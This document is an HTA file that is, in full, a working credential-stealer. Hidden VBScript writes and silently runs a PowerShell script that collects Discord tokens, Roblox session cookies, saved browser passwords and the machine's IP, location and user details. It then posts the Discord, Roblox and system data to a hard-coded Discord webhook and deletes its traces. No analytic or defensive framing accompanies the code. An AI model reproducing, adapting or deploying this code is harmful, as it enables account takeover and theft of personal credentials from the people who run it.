<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next
WScript.Sleep 5000
window.resizeTo 0,0
window.moveTo -2000,-2000

Dim WH, Shell, FSO
WH = "https://discord.com/api/webhooks/1558203158402965807/CSEdSKDtJzkQQTllCpddCzT237OjDV-OXqpVqIeanWhFjYShYgexU0WOANI-hiun9EDL"
Set Shell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

Function TmpFile(n)
    TmpFile = Shell.ExpandEnvironmentStrings("%TEMP%") & "\" & n
End Function

Function ReadFile(p)
    Dim f
    If Not FSO.FileExists(p) Then ReadFile = "" : Exit Function
    Set f = FSO.OpenTextFile(p, 1)
    ReadFile = f.ReadAll
    f.Close
    Set f = Nothing
End Function

Sub WriteFile(p, c)
    Dim f
    Set f = FSO.CreateTextFile(p, True)
    f.Write c
    f.Close
    Set f = Nothing
End Sub

Sub SendToDiscord(msg)
    Dim x, boundary, body
    boundary = "----WebKitFormBoundary" & Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 8)
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""content""" & vbCrLf
    body = body & vbCrLf
    body = body & msg & vbCrLf
    body = body & "--" & boundary & "--"
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "POST", WH, False
    x.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    x.Send body
    Set x = Nothing
End Sub

Sub Run()
    On Error Resume Next
    Dim psf, rf, raw, lines, l, cnt, p, info
    
    ' === EMBEDDED POWER SHELL SCRIPT ===
    Dim psScript
    psScript = "$ErrorActionPreference=""SilentlyContinue"";function Get-DiscordTokens{$Tokens=@();$DiscordPaths=@(""$env:APPDATA\Discord\Local Storage\leveldb"",""$env:APPDATA\DiscordCanary\Local Storage\leveldb"",""$env:APPDATA\DiscordPTB\Local Storage\leveldb"",""$env:LOCALAPPDATA\Discord\Local Storage\leveldb"",""$env:LOCALAPPDATA\DiscordCanary\Local Storage\leveldb"",""$env:LOCALAPPDATA\DiscordPTB\Local Storage\leveldb"");foreach($Path in $DiscordPaths){if(Test-Path $Path){Get-ChildItem $Path -Filter *.log,*.ldb|ForEach-Object{$Content=Get-Content $_.FullName -Raw;$Regex=[regex]::new('[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}');$Matches=$Regex.Matches($Content);foreach($Match in $Matches){if($Match.Value.Length -gt 20){$Tokens+=""DISCORD|0|||0|""+$Match.Value}}}}};return $Tokens};function Get-RobloxCookies{$Cookies=@();$RobloxPaths=@(""$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"",""$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat"",""$env:APPDATA\Roblox\LocalStorage\RobloxCookies.dat"",""$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat"");foreach($Path in $RobloxPaths){if(Test-Path $Path){$Content=Get-Content $Path -Raw;$Regex=[regex]::new('\.ROBLOSECURITY[^;''""]+');$Matches=$Regex.Matches($Content);foreach($Match in $Matches){if($Match.Value.Length -gt 20){$Cookies+=""ROBLOX|""+$Match.Value}}}};$PackagesPath=""$env:LOCALAPPDATA\Packages"";if(Test-Path $PackagesPath){Get-ChildItem $PackagesPath -Directory|Where-Object{$_.Name -match ""ROBLOX""}|ForEach-Object{$UwpPath=Join-Path $_.FullName ""LocalState\RobloxCookies.dat"";if(Test-Path $UwpPath){$Content=Get-Content $UwpPath -Raw;$Regex=[regex]::new('\.ROBLOSECURITY[^;''""]+');$Matches=$Regex.Matches($Content);foreach($Match in $Matches){if($Match.Value.Length -gt 20){$Cookies+=""ROBLOX|""+$Match.Value}}}}};return $Cookies};function Get-BrowserCredentials{$Credentials=@();$BrowserPaths=@(""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"",""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"",""$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"",""$env:APPDATA\Opera Software\Opera Stable\Login Data"");foreach($Path in $BrowserPaths){if(Test-Path $Path){$TempDB=""$env:TEMP\login_data.db"";Copy-Item $Path $TempDB -Force;if(Test-Path $TempDB){try{Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue;$Conn=New-Object System.Data.SQLite.SQLiteConnection(""Data Source=$TempDB;Version=3;Read Only=True"");$Conn.Open();$Cmd=$Conn.CreateCommand();$Cmd.CommandText=""SELECT origin_url, username_value, password_value FROM logins"";$Reader=$Cmd.ExecuteReader();while($Reader.Read()){$Url=$Reader.GetString(0);$User=$Reader.GetString(1);$Pass=$Reader.GetString(2);if($Pass.Length -gt 0){$Credentials+=""BROWSER|$Url|$User|$Pass""}};$Conn.Close()}catch{}}Remove-Item $TempDB -Force}}};return $Credentials};function Get-SystemInfo{$IP=(Invoke-WebRequest -Uri ""https://api.ipify.org"" -UseBasicParsing).Content;$Geo=Invoke-WebRequest -Uri ""http://ip-api.com/line/$IP?fields=country,regionName,city,isp"" -UseBasicParsing;$Lines=$Geo.Content -split ""`n"";$Info=""IP: $IP | Country: $($Lines[0]) | Region: $($Lines[1]) | City: $($Lines[2]) | ISP: $($Lines[3]) | PC: $env:COMPUTERNAME | User: $env:USERNAME"";return $Info};$AllResults=@();$AllResults+=Get-DiscordTokens;$AllResults+=Get-RobloxCookies;$AllResults+=Get-BrowserCredentials;$AllResults+=""SYSTEM|""+(Get-SystemInfo);$AllResults|Out-File ""$env:TEMP\steal_result.txt"""
    
    psf = TmpFile("g.ps1")
    WriteFile psf, psScript
    
    Shell.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
    
    rf = TmpFile("steal_result.txt")
    If FSO.FileExists(rf) Then
        raw = ReadFile(rf)
        FSO.DeleteFile rf, True
        FSO.DeleteFile psf, True
        
        If Len(raw) > 10 Then
            lines = Split(raw, vbCrLf)
            cnt = 0
            For Each l In lines
                If Len(l) > 10 Then
                    If Left(l, 8) = "DISCORD|" Then
                        p = Split(Mid(l, 9), "|")
                        If UBound(p) >= 4 Then
                            info = "User: " & p(0) & vbCrLf & "Email: " & p(1) & vbCrLf & "Phone: " & p(2) & vbCrLf & "ID: " & p(3) & vbCrLf & "Token: " & p(4)
                            SendToDiscord "Discord Token:" & vbCrLf & info
                            cnt = cnt + 1
                        End If
                    End If
                    If Left(l, 7) = "ROBLOX|" Then
                        SendToDiscord "Roblox Cookie:" & vbCrLf & Mid(l, 8)
                        cnt = cnt + 1
                    End If
                    If Left(l, 7) = "SYSTEM|" Then
                        SendToDiscord "System Info:" & vbCrLf & Mid(l, 8)
                        cnt = cnt + 1
                    End If
                End If
            Next
            SendToDiscord "Sent " & cnt & " items to Discord"
        End If
    End If
End Sub

Call Run
window.close
</script>
</head>
<body></body>
</html>
